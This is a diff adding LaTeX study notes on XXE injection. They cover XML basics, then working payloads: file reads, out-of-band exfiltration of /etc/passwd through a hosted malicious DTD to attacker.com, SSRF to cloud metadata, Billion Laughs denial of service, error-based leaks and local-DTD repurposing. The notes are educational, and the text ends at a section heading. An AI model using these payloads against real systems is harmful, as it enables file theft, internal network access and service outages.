@@ -1,0 +1,1149 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{xcolor}
+\usepackage{tcolorbox}
+\usepackage{fancyhdr}
+
+% Configure listings for code highlighting
+\lstset{
+    numbers=left,
+    numberstyle=\tiny\color{gray},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!5},
+    keywordstyle=\color{blue},
+    commentstyle=\color{green!50!black},
+    stringstyle=\color{red},
+    showstringspaces=false,
+    tabsize=2
+}
+
+% Define custom colors
+\definecolor{note}{RGB}{50,150,200}
+\definecolor{warning}{RGB}{200,100,50}
+\definecolor{danger}{RGB}{200,50,50}
+\definecolor{xmlcolor}{RGB}{34,139,34}
+
+% Create custom tcolorbox environments
+\newtcolorbox{infobox}[1][]{colback=note!5,colframe=note!75!black,title=#1}
+\newtcolorbox{warningbox}[1][]{colback=warning!5,colframe=warning!75!black,title=#1}
+\newtcolorbox{dangerbox}[1][]{colback=danger!5,colframe=danger!75!black,title=#1}
+\newtcolorbox{codebox}[1][]{colback=gray!5,colframe=black!50!black,title=#1}
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+\title{XXE Notes: XML External Entity Injection}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+\maketitle
+
+
+
+\section{Understanding XML}
+
+\subsection{What is XML?}
+XML (eXtensible Markup Language) is a markup language designed for storing and transporting data. Unlike HTML which focuses on displaying data, XML focuses on describing the structure and meaning of data.
+
+\begin{infobox}[Key Concept]
+XML is both human-readable and machine-readable, making it popular for:
+\begin{itemize}
+    \item Configuration files
+    \item Web services (SOAP, REST)
+    \item Document formats (Office Open XML, SVG)
+    \item Data exchange between systems
+    \item RSS feeds and sitemaps
+\end{itemize}
+\end{infobox}
+
+\subsection{XML Structure and Syntax}
+
+\subsubsection{Basic XML Components}
+\begin{lstlisting}[language=XML, caption=Basic XML Structure]
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+    <element attribute="value">Content here</element>
+    <empty_element/>
+    <nested>
+        <child>Child content</child>
+    </nested>
+</root>
+\end{lstlisting}
+
+\subsubsection{Key XML Components Explained}
+\begin{table}[h]
+\centering
+\begin{tabular}{ll}
+\toprule
+\textbf{Component} & \textbf{Description} \\
+\midrule
+XML Declaration & Specifies XML version and encoding: \texttt{<?xml version="1.0"?>} \\
+Elements & Building blocks: \texttt{<tag>content</tag>} \\
+Attributes & Additional info within tags: \texttt{<tag name="value">} \\
+Comments & Human notes: \texttt{<!-- comment -->} \\
+CDATA & Unparsed character data: \texttt{<![CDATA[ raw data ]]>} \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsection{XML Entities}
+Entities in XML are used to represent special characters or reusable content.
+
+\subsubsection{Predefined Entities}
+\begin{table}[h]
+\centering
+\begin{tabular}{lll}
+\toprule
+\textbf{Character} & \textbf{Entity} & \textbf{Description} \\
+\midrule
+< & \&lt; & Less than \\
+> & \&gt; & Greater than \\
+\& & \&amp; & Ampersand \\
+" & \&quot; & Double quote \\
+' & \&apos; & Apostrophe \\
+\bottomrule
+\end{tabular}
+\caption{Predefined XML Entities}
+\end{table}
+
+\subsubsection{Custom Entities}
+\begin{lstlisting}[language=XML, caption=Custom Entity Declaration]
+<?xml version="1.0"?>
+<!DOCTYPE example [
+    <!ENTITY author "Eyad Islam El-Taher">
+    <!ENTITY company "Security Research">
+]>
+<document>
+    <info>&author; works at &company;</info>
+</document>
+\end{lstlisting}
+
+\subsection{Document Type Definition (DTD)}
+DTD defines the structure, elements, and entities of an XML document.
+
+\begin{lstlisting}[language=XML, caption=DTD Example]
+<?xml version="1.0"?>
+<!DOCTYPE note [
+    <!ELEMENT note (to,from,heading,body)>
+    <!ELEMENT to (#PCDATA)>
+    <!ELEMENT from (#PCDATA)>
+    <!ELEMENT heading (#PCDATA)>
+    <!ELEMENT body (#PCDATA)>
+    <!ENTITY message "Hello, World!">
+]>
+<note>
+    <to>Reader</to>
+    <from>Author</from>
+    <heading>Welcome</heading>
+    <body>&message;</body>
+</note>
+\end{lstlisting}
+
+\section{Understanding XXE}
+
+\subsection{What is XXE?}
+XML External Entity (XXE) Injection is a security vulnerability that occurs when an XML parser processes external entities declared within a DTD, allowing attackers to:
+\begin{itemize}
+    \item Read arbitrary files from the server
+    \item Perform SSRF (Server-Side Request Forgery) attacks
+    \item Execute denial of service (Billion Laughs attack)
+    \item Port scan internal networks
+    \item Achieve remote code execution in some cases
+\end{itemize}
+
+
+\subsection{How XXE Works}
+The vulnerability arises when XML parsers process external entities that reference:
+\begin{itemize}
+    \item Local files using \texttt{file://} protocol
+    \item Internal network resources via \texttt{http://}
+    \item System commands (in some parsers)
+\end{itemize}
+
+\subsection{Types of XXE Attacks}
+
+\subsubsection{Classic XXE (File Read)}
+\begin{lstlisting}[language=XML, caption=Basic File Read XXE]
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+\end{lstlisting}
+
+\subsubsection{XXE via Parameter Entities}
+\begin{lstlisting}[language=XML, caption=Parameter Entity XXE]
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+    <!ENTITY % param1 SYSTEM "http://attacker.com/evil.dtd">
+    %param1;
+]>
+<root>&exploit;</root>
+\end{lstlisting}
+
+\subsubsection{Blind XXE (Out-of-Band)}
+\begin{lstlisting}[language=XML, caption=Blind XXE with Burp Collaborator]
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://dbsepsthvaf8qanj3llbwfinfel59wxl.oastify.com"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+\end{lstlisting}
+
+
+\section{Exploitation Techniques}
+
+\subsection{File Reading}
+\begin{lstlisting}[language=XML, caption=Reading Files on Different Systems]
+<!-- Linux/Unix -->
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+<!-- Windows -->
+<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+
+<!-- Using PHP wrappers -->
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
+
+<!-- Using expect wrapper (if enabled) -->
+<!ENTITY xxe SYSTEM "expect://id">
+\end{lstlisting}
+
+\subsection{SSRF and Internal Network Discovery}
+\begin{lstlisting}[language=XML, caption=SSRF via XXE]
+<!-- Port scanning -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
+
+<!-- Access internal services -->
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+
+<!-- Read internal admin panels -->
+<!ENTITY xxe SYSTEM "http://internal-admin.local/settings">
+\end{lstlisting}
+
+\subsection{Denial of Service - Billion Laughs Attack}
+\begin{lstlisting}[language=XML, caption=Recursive Entity Expansion DoS]
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+    <!ENTITY lol "lol">
+    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+\end{lstlisting}
+
+\subsection{Bypassing Protections}
+
+\begin{warningbox}[Filter Bypass Techniques]
+Common XXE bypass techniques:
+\begin{itemize}
+    \item Using UTF-16/UTF-32 encoding
+    \item Using parameter entities instead of general entities
+    \item Using XInclude as alternative to DTD
+    \item Using SVG upload vectors
+    \item Using SOAP/XML-RPC endpoints
+\end{itemize}
+\end{warningbox}
+
+\section{Advanced XXE: Parameter Entities and Blind XXE}
+
+\subsection{Limitations of Regular Entities}
+Sometimes, XXE attacks using regular entities are blocked due to:
+\begin{itemize}
+    \item Input validation by the application
+    \item Hardening of the XML parser configuration
+    \item Filtering of standard entity syntax
+    \item Disabled external general entities
+\end{itemize}
+
+In these situations, you might be able to use \textbf{XML parameter entities} instead.
+
+\subsection{Understanding XML Parameter Entities}
+
+XML parameter entities are a special kind of XML entity that can \textbf{only be referenced within the DTD} (Document Type Definition), not in the XML body.
+
+\begin{infobox}[Key Difference]
+Unlike regular entities that use \texttt{\&entity;}, parameter entities use \texttt{\%entity;} and can only appear inside DTD declarations.
+\end{infobox}
+
+\subsubsection{Parameter Entity Declaration}
+The declaration of an XML parameter entity includes the percent character (\%) before the entity name:
+
+\begin{lstlisting}[language=XML]
+<!ENTITY % myparameterentity "my parameter entity value">
+\end{lstlisting}
+
+\subsubsection{Parameter Entity Reference}
+Parameter entities are referenced using the percent character instead of the usual ampersand:
+
+\begin{lstlisting}[language=XML]
+%myparameterentity;
+\end{lstlisting}
+
+\subsection{Blind XXE Using Parameter Entities}
+
+Parameter entities are particularly useful for \textbf{Blind XXE} attacks where you cannot see the response output. They enable out-of-band (OOB) data exfiltration.
+
+\subsubsection{Basic OOB Detection}
+This payload causes a DNS lookup and HTTP request to the attacker's domain:
+
+\begin{lstlisting}[language=XML, caption=OOB Detection via Parameter Entities]
+<!DOCTYPE foo [ 
+    <!ENTITY % xxe SYSTEM "http://dbsepsthvaf8qanj3llbwfinfel59wxl.oastify.com"> 
+    %xxe; 
+]>
+\end{lstlisting}
+
+\begin{codebox}[How it works]
+\begin{enumerate}
+    \item Declares a parameter entity \texttt{xxe} referencing an external URL
+    \item References the entity using \texttt{\%xxe;}
+    \item When parsed, the XML processor makes a request to the attacker's server
+    \item The attacker receives the request, confirming XXE vulnerability
+\end{enumerate}
+\end{codebox}
+
+\section{Exploiting Blind XXE to Exfiltrate Data Out-of-Band}
+
+\subsection{From Detection to Exploitation}
+
+Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to \textbf{exfiltrate sensitive data}.
+
+\begin{infobox}[The Goal]
+A blind XXE vulnerability becomes truly dangerous when attackers can exfiltrate sensitive data from the target server to their own infrastructure.
+\end{infobox}
+
+\subsection{The Approach: Hosted Malicious DTD}
+
+Exfiltrating data via blind XXE involves:
+\begin{enumerate}
+    \item Hosting a malicious DTD on a system the attacker controls
+    \item Invoking the external DTD from within the in-band XXE payload
+    \item The DTD reads local files and sends them to the attacker
+\end{enumerate}
+
+\subsection{Anatomy of a Malicious DTD for Data Exfiltration}
+
+\subsubsection{Complete Malicious DTD Example}
+Here's an example of a malicious DTD designed to exfiltrate the contents of the \texttt{/etc/passwd} file:
+
+\begin{lstlisting}[language=XML, caption=malicious.dtd - Data Exfiltration Payload]
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+\end{lstlisting}
+
+\subsection{Step-by-Step Breakdown}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|p{3cm}|p{10cm}|}
+\hline
+\textbf{Step} & \textbf{Action} \\
+\hline
+1.Define file entity & Declares parameter entity \texttt{file} containing contents of \texttt{/etc/passwd} \\
+\hline
+2.Define eval entity & Declares \texttt{eval} containing dynamic declaration of \texttt{exfiltrate} entity \\
+\hline
+3.Execute eval & Uses \texttt{eval} entity to trigger dynamic declaration of \texttt{exfiltrate} \\
+\hline
+4.Execute exfiltrate & Evaluates \texttt{exfiltrate} by requesting URL with stolen data \\
+\hline
+\end{tabular}
+\caption{Malicious DTD Execution Steps}
+\end{table}
+
+\subsubsection{Detailed Explanation of Each Step}
+
+\begin{enumerate}
+    \item \textbf{Define the file entity:}
+    \begin{lstlisting}[language=XML]
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+\end{lstlisting}
+    This defines an XML parameter entity called \texttt{file} that contains the contents of the \texttt{/etc/passwd} file.
+
+    \item \textbf{Define the eval entity:}
+    \begin{lstlisting}[language=XML]
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+\end{lstlisting}
+    This defines an XML parameter entity called \texttt{eval} containing a dynamic declaration of another XML parameter entity called \texttt{exfiltrate}. The \texttt{exfiltrate} entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the \texttt{file} entity within the URL query string.
+    
+    \begin{warningbox}[Encoding Note]
+    The \texttt{\&\#x25;} is the XML entity encoding for the percent sign (\%). This encoding is necessary because using a raw \% character would be interpreted as the start of a parameter entity reference within the DTD, causing a parsing error.
+    \end{warningbox}
+
+    \item \textbf{Use the eval entity:}
+    \begin{lstlisting}[language=XML]
+%eval;
+\end{lstlisting}
+    This uses the \texttt{eval} entity, which causes the dynamic declaration of the \texttt{exfiltrate} entity to be performed.
+
+    \item \textbf{Use the exfiltrate entity:}
+    \begin{lstlisting}[language=XML]
+%exfiltrate;
+\end{lstlisting}
+    This uses the \texttt{exfiltrate} entity, causing its value to be evaluated by requesting the specified URL with the stolen data.
+\end{enumerate}
+
+\subsection{Hosting the Malicious DTD}
+
+The attacker must host the malicious DTD on a system they control, typically by loading it onto their own web server.
+
+\begin{lstlisting}[language=bash, caption=Hosting the DTD on Attacker's Server]
+# Create the malicious DTD file
+echo '<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;' > malicious.dtd
+
+# Serve it via HTTP (Python example)
+python3 -m http.server 80
+
+# Or using ngrok for temporary public URL
+ngrok http 80
+\end{lstlisting}
+
+The attacker serves the malicious DTD at a URL such as:
+\begin{lstlisting}
+http://attacker.com/malicious.dtd
+\end{lstlisting}
+
+\subsection{Triggering the Attack}
+
+The attacker submits the following XXE payload to the vulnerable application:
+
+\begin{lstlisting}[language=XML, caption=Final XXE Payload to Trigger Exfiltration]
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
+    %xxe;
+]>
+\end{lstlisting}
+
+\begin{codebox}[Attack Workflow]
+\begin{enumerate}
+    \item Payload declares XML parameter entity called \texttt{xxe}
+    \item Uses the entity within the DTD with \texttt{\%xxe;}
+    \item XML parser fetches external DTD from attacker's server
+    \item Malicious DTD is interpreted inline
+    \item Steps in malicious DTD execute sequentially
+    \item \texttt{/etc/passwd} contents are transmitted to attacker's server
+\end{enumerate}
+\end{codebox}
+
+\subsection{Visual Attack Flow}
+
+\begin{tcolorbox}[colback=gray!5,colframe=black!50,title=Attack Visualization]
+\begin{verbatim}
+Victim Server                    Attacker Server
+     |                                |
+     |  1. XXE Payload                |
+     |  ----------------------------> |
+     |     (malicious.dtd request)    |
+     |                                |
+     |  2. Serve malicious.dtd        |
+     |  <---------------------------- |
+     |                                |
+     |  3. Parse DTD, read /etc/passwd|
+     |                                |
+     |  4. HTTP request with data     |
+     |  ----------------------------> |
+     |     GET /?x=root:x:0:0:...     |
+     |                                |
+     |  5. Data exfiltrated!          |
+\end{verbatim}
+\end{tcolorbox}
+
+\subsection{Common Issues and Workarounds}
+
+\subsubsection{Issue 1: Newline Characters Break Exfiltration}
+
+\begin{warningbox}[The Newline Problem]
+This technique might not work with some file contents, including the newline characters contained in the \texttt{/etc/passwd} file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters allowed to appear within the URL.
+\end{warningbox}
+
+\subsubsection{Solution 1: Use FTP Protocol Instead of HTTP}
+\begin{lstlisting}[language=XML, caption=FTP-Based Exfiltration]
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://attacker.com/%file;'>">
+%eval;
+%exfiltrate;
+\end{lstlisting}
+
+\subsubsection{Solution 2: Target Files Without Newlines}
+Sometimes, it will not be possible to exfiltrate data containing newline characters. In this situation, target alternative files:
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{File} & \textbf{Content Type} \\
+\hline
+/etc/hostname & Single line hostname \\
+\hline
+/etc/issue & System identification \\
+\hline
+/proc/version & Kernel version (single line) \\
+\hline
+/etc/passwd & Multiple lines (problematic) \\
+\hline
+/app/config.py & Configuration (may have special chars) \\
+\hline
+\end{tabular}
+\caption{Files Suitable vs Unsuitable for URL Exfiltration}
+\end{table}
+
+\newpage
+\subsubsection{Solution 3: Use Base64 Encoding}
+Encode the file content to remove problematic characters:
+
+\begin{lstlisting}[language=XML, caption=Base64 Encoded Exfiltration]
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfiltrate;
+\end{lstlisting}
+
+\section{Exploiting Blind XXE to Retrieve Data via Error Messages}
+
+An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This technique is particularly effective when the application returns the resulting error message within its response.
+
+\begin{infobox}[Error-Based Exfiltration]
+Instead of sending data out-of-band to an attacker-controlled server, this technique forces the XML parser to include the stolen data directly in an error message that gets returned to the attacker.
+\end{infobox}
+
+\subsubsection{When to Use This Technique}
+
+This approach is useful when:
+\begin{itemize}
+    \item Out-of-band exfiltration is blocked by network firewalls
+    \item The application displays verbose error messages to users
+    \item You cannot host an external server for data exfiltration
+    \item The XML parser has network restrictions but allows file access
+\end{itemize}
+
+\subsubsection{Malicious DTD for Error-Based Exfiltration}
+
+You can trigger an XML parsing error message containing the contents of the \texttt{/etc/passwd} file using a malicious external DTD as follows:
+
+\begin{lstlisting}[language=XML, caption=malicious.dtd - Error-Based Exfiltration]
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+\end{lstlisting}
+
+\subsubsection{Step-by-Step Breakdown}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|p{3cm}|p{10cm}|}
+\hline
+\textbf{Step} & \textbf{Action} \\
+\hline
+1. Define file & Defines XML parameter entity \texttt{file} containing contents of \texttt{/etc/passwd} \\
+\hline
+2. Define eval & Defines \texttt{eval} containing dynamic declaration of \texttt{error} entity \\
+\hline
+3. Execute eval & Uses \texttt{eval} entity to trigger dynamic declaration of \texttt{error} \\
+\hline
+4. Execute error & Uses \texttt{error} entity attempting to load nonexistent file with stolen data in path \\
+\hline
+\end{tabular}
+\caption{Error-Based XXE Execution Steps}
+\end{table}
+
+\subsubsection{Detailed Explanation of Each Step}
+
+\begin{enumerate}
+    \item \textbf{Define the file entity:}
+    \begin{lstlisting}[language=XML]
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+\end{lstlisting}
+    This defines an XML parameter entity called \texttt{file} that contains the contents of the \texttt{/etc/passwd} file. The entire file content is stored in this entity.
+
+    \item \textbf{Define the eval entity:}
+    \begin{lstlisting}[language=XML]
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+\end{lstlisting}
+    This defines an XML parameter entity called \texttt{eval} containing a dynamic declaration of another XML parameter entity called \texttt{error}. The \texttt{error} entity will be evaluated by attempting to load a nonexistent file whose name contains the value of the \texttt{file} entity.
+    
+    \begin{warningbox}[The Key Insight]
+    By placing the stolen data (\texttt{\%file;}) inside the path of a nonexistent file, the data becomes part of the filename that will appear in the resulting error message.
+    \end{warningbox}
+
+    \item \textbf{Use the eval entity:}
+    \begin{lstlisting}[language=XML]
+%eval;
+\end{lstlisting}
+    This uses the \texttt{eval} entity, which causes the dynamic declaration of the \texttt{error} entity to be performed. The parser processes the content of \texttt{eval} as DTD code.
+
+    \item \textbf{Use the error entity:}
+    \begin{lstlisting}[language=XML]
+%error;
+\end{lstlisting}
+    This uses the \texttt{error} entity, causing its value to be evaluated by attempting to load the nonexistent file. Since the file doesn't exist, the XML parser throws a \texttt{FileNotFoundException} (or similar error) that includes the full path - which contains the stolen data.
+\end{enumerate}
+
+\subsubsection{The Resulting Error Message}
+
+Invoking the malicious external DTD will result in an error message like the following:
+
+\begin{lstlisting}[caption=Error Message Containing Exfiltrated Data]
+java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+... (FileNotFoundException thrown)
+\end{lstlisting}
+
+\subsubsection{Triggering the Attack}
+
+The attacker submits the following XXE payload to the vulnerable application:
+
+\begin{lstlisting}[language=XML, caption=Payload to Trigger Error-Based Exfiltration]
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
+    %xxe;
+]>
+\end{lstlisting}
+
+\section{Exploiting Blind XXE by Repurposing a Local DTD}
+
+When out-of-band interactions are blocked and external DTDs cannot be loaded from remote servers, attackers need an alternative approach. This section covers a sophisticated technique that repurposes existing DTD files on the local filesystem to trigger error-based data exfiltration.
+
+\subsubsection{Limitations of Internal DTDs}
+
+The error-based technique described in the previous section works fine with an external DTD, but it won't normally work with an internal DTD that is fully specified within the DOCTYPE element. 
+
+\begin{warningbox}[The XML Specification Restriction]
+The technique involves using an XML parameter entity within the definition of another parameter entity. Per the XML specification, this is \textbf{permitted in external DTDs but not in internal DTDs}. Some parsers might tolerate it, but many do not.
+\end{warningbox}
+
+This creates a challenge:
+\begin{itemize}
+    \item Out-of-band interactions are blocked (no external connections)
+    \item Cannot load an external DTD from a remote server
+    \item Internal DTDs cannot use nested parameter entities
+    \item How can we trigger error messages containing sensitive data?
+\end{itemize}
+
+\subsubsection{The Loophole: Hybrid DTD Declarations}
+
+There is a loophole in the XML language specification that makes this attack possible. 
+
+\begin{infobox}[The Hybrid DTD Loophole]
+If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can \textbf{redefine entities} that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is \textbf{relaxed}.
+\end{infobox}
+
+This means an attacker can employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity they use is redefining an entity that is declared within an external DTD.
+
+
+\begin{quote}
+\textbf{Note:} This technique was pioneered by Arseniy Sharoglazov and ranked \#7 in the top 10 web hacking techniques of 2018.
+\end{quote}
+
+\subsubsection{Attack Prerequisites}
+
+For this attack to work, you need:
+\begin{enumerate}
+    \item A DTD file that exists on the server filesystem
+    \item Knowledge of the DTD file's path
+    \item An entity within that DTD that can be redefined
+    \item The application must return error messages in responses
+\end{enumerate}
+
+\subsection{Example Attack Scenario}
+
+\subsubsection{Step 1: Identify a Local DTD File}
+
+Suppose there is a DTD file on the server filesystem at the location:
+\begin{lstlisting}
+/usr/local/app/schema.dtd
+\end{lstlisting}
+
+This DTD file defines an entity called \texttt{customEntity}.
+
+\subsubsection{Step 2: Craft the Hybrid DTD Payload}
+
+An attacker can trigger an XML parsing error message containing the contents of the \texttt{/etc/passwd} file by submitting a hybrid DTD like the following:
+
+\begin{lstlisting}[language=XML, caption=Hybrid DTD Payload Repurposing Local DTD]
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % customEntity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+\end{lstlisting}
+
+\subsubsection{Step-by-Step Breakdown}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|p{3.5cm}|p{10cm}|}
+\hline
+\textbf{Step} & \textbf{Action} \\
+\hline
+1. Define local\_dtd & Declares parameter entity containing the external DTD file from server filesystem \\
+\hline
+2. Redefine customEntity & Redefines existing entity with error-based XXE exploit payload \\
+\hline
+3. Execute local\_dtd & Uses entity to load and interpret external DTD with redefined value \\
+\hline
+4. Trigger Error & Results in error message containing \texttt{/etc/passwd} contents \\
+\hline
+\end{tabular}
+\caption{Hybrid DTD Attack Steps}
+\end{table}
+
+\subsubsection{Detailed Explanation of Each Component}
+
+\begin{enumerate}
+    \item \textbf{Define the local\_dtd entity:}
+    \begin{lstlisting}[language=XML]
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+\end{lstlisting}
+    This defines an XML parameter entity called \texttt{local\_dtd} that contains the contents of the external DTD file that exists on the server filesystem.
+
+    \item \textbf{Redefine the custom\_entity entity:}
+    \begin{lstlisting}[language=XML]
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+\end{lstlisting}
+    
+    This redefines the XML parameter entity called \texttt{custom\_entity}, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit for triggering an error message containing the contents of \texttt{/etc/passwd}.
+    
+
+    \item \textbf{Use the local\_dtd entity:}
+    \begin{lstlisting}[language=XML]
+%local_dtd;
+\end{lstlisting}
+    This uses the \texttt{local\_dtd} entity, so that the external DTD is interpreted, including the redefined value of the \texttt{custom\_entity} entity. This results in the desired error message.
+\end{enumerate}
+
+\subsection{Locating an Existing DTD File to Repurpose}
+
+Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file.
+
+\begin{infobox}[Finding Local DTD Files]
+This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.
+\end{infobox}
+
+\subsubsection{DTD Discovery Payload}
+
+To test whether a DTD file exists at a specific path:
+
+\begin{lstlisting}[language=XML, caption=Testing for Local DTD Existence]
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+\end{lstlisting}
+
+\begin{itemize}
+    \item \textbf{If the file exists:} The DTD loads without error (or with DTD-specific errors)
+    \item \textbf{If the file is missing:} The parser throws a file not found error
+\end{itemize}
+
+\subsubsection{Common DTD Locations by System}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{System/Software} & \textbf{Common DTD Paths} \\
+\hline
+Linux (GNOME) & /usr/share/yelp/dtd/docbookx.dtd \\
+\hline
+Linux (General) & /usr/share/xml/schema/ \\
+\hline
+Windows & C:\textbackslash Program Files\textbackslash Common Files\textbackslash \\
+\hline
+Apache Tomcat & /usr/share/tomcat/conf/web.xml (not DTD but useful) \\
+\hline
+Java Applications & /WEB-INF/web.xml, /META-INF/*.dtd \\
+\hline
+\end{tabular}
+\caption{Common Local DTD Locations}
+\end{table}
+
+\subsection{Practical Example: GNOME Desktop Environment}
+
+Systems using the GNOME desktop environment often have a DTD file at:
+\begin{lstlisting}
+/usr/share/yelp/dtd/docbookx.dtd
+\end{lstlisting}
+
+This DTD file contains an entity called \texttt{ISOamso}.
+
+\subsubsection{Complete Attack Payload for GNOME Systems}
+
+\begin{lstlisting}[language=XML, caption=Repurposing docbookx.dtd's ISOamso Entity]
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+\end{lstlisting}
+
+\subsection{Step-by-Step Attack Workflow}
+
+\begin{tcolorbox}[colback=gray!5,colframe=blue!50,title=Complete Attack Process]
+\begin{verbatim}
+1. ENUMERATE
+   Test common DTD paths to find an existing file
+   Example: /usr/share/yelp/dtd/docbookx.dtd
+
+2. IDENTIFY
+   Obtain a copy of the found DTD file
+   Search for entity names that can be redefined
+   Example: ISOamso entity in docbookx.dtd
+
+3. CRAFT
+   Create hybrid DTD payload that:
+   - Loads the local DTD file
+   - Redefines an existing entity with malicious content
+   - Includes error-based XXE payload
+
+4. DELIVER
+   Submit payload to vulnerable XML endpoint
+   Application processes hybrid DTD
+
+5. EXFILTRATE
+   Error message containing /etc/passwd is returned
+   Attacker extracts sensitive data
+\end{verbatim}
+\end{tcolorbox}
+
+\section{Finding Hidden Attack Surface for XXE Injection}
+
+\subsubsection{Obvious vs Hidden Attack Surface}
+
